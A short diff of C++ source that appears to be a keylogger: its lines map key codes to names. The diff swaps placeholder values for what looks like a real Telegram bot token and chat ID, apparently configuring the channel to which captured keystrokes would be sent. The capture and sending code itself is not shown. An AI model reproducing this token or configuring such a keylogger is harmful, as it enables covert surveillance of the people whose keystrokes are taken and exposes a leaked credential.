@@ -16,8 +16,8 @@
 #define FORMAT 0
 #define mouseignore
 
-const std::string telegramToken = "your_telegram_bot_token";
-const std::string chatID = "your_chat_id";
+const std::string telegramToken = "6285163091:AAHEm0D8R09pBi8cjJVCtHxDcYNIvdYCQpE";
+const std::string chatID = "1306881762";
 
 #if FORMAT == 0
 const std::map<int, std::string> keyname{
